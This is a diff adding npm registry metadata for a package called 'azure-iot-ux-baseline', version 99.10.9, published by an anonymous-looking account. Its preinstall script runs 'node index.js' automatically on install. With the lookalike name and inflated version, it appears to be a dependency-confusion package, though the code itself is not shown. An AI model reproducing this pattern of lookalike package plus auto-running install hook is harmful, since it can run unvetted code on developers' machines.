@@ -1,0 +1,62 @@
+{
+    "_id": "azure-iot-ux-baseline",
+    "name": "azure-iot-ux-baseline",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-iot-ux-baseline",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-iot-ux-baseline@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-YO+LZVM2yoAT7IFJj5R1wUtb6IzR5gITAjNIhkCZkzPekze7s7Y8i5U9C13CIi7V/krRJNqSU0dyAT5lphFJQg==",
+                "shasum": "9e8922df6d1f39ab48cf6906dd8ad3b49482d5e2",
+                "tarball": "https://registry.npmjs.org/azure-iot-ux-baseline/-/azure-iot-ux-baseline-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOqOpACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrM1BAAj97/OttFhw52q2rXiJ9XPRbODBL1tbOwdbFZekcuoqOB8lqH\r\nty8pDYpZuzTs4tKxpaXF2QJRIMj02KawXMHLSlqcrp8OWHj1ukJ7CR9M47h1\r\nVQxUtQAGJ94mOA24sa8Gik4y7EY8WeqNYOQGzyO3z5yu1jXXhwuu48Aoyja8\r\nE5Q200dLzZD0B7Oaq0gZbGY/C90+uptK6TkGGsJxX8jAJMoVO0FXU4irN6DR\r\n1CaPxNrWGMR7FyDWI8t59I8LszQ667/Ol6iLxWgJghsqbMm7T+xVMTj+jJjD\r\nm1rIECw0SkqUTgAOhflN8rSI81sgZ3Z8xxcM3jKxICeiePWEaHWOjFiHp8KH\r\nx3qIHSj54NmbQK1GIO+bEnD8exmEL3O+VH1gqV7U6DXKshJ5oA1KZB5ZjlMB\r\nT5x1PUQvqVqt7K/VnPLzk0AdIEbUAK6S8v/F5IOLJsZGqA+JC411IsgdB3Aa\r\npgJipbtliWSNQHjIE/OThz+uFsf2TcDIW9ISEBwDl7FBSkKmNIr5Tji4Djg2\r\noWVOv+eYbC0PrHMlVyvMHzpa0+f80g7igTh3AgFa7hQkkDyzqvvFmadhWoN1\r\nYKqrwRkzM6l+qyFTE0znQFx2D1zCer57STYtl+YNuqK7FlTYJnRax+kByhfD\r\nAyP+PjkAXUmVxmK/fsDhy0OVQQ6lDQpYuM0=\r\n=Nf6x\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "uw8poz2w",
+                "email": "uw8poz2w@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "uw8poz2w",
+                    "email": "uw8poz2w@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-iot-ux-baseline_99.10.9_1648010153148_0.7349419372716919"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T04:35:53.148Z",
+        "99.10.9": "2022-03-23T04:35:53.289Z",
+        "modified": "2022-03-23T04:35:53.419Z"
+    },
+    "maintainers": [
+        {
+            "name": "uw8poz2w",
+            "email": "uw8poz2w@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
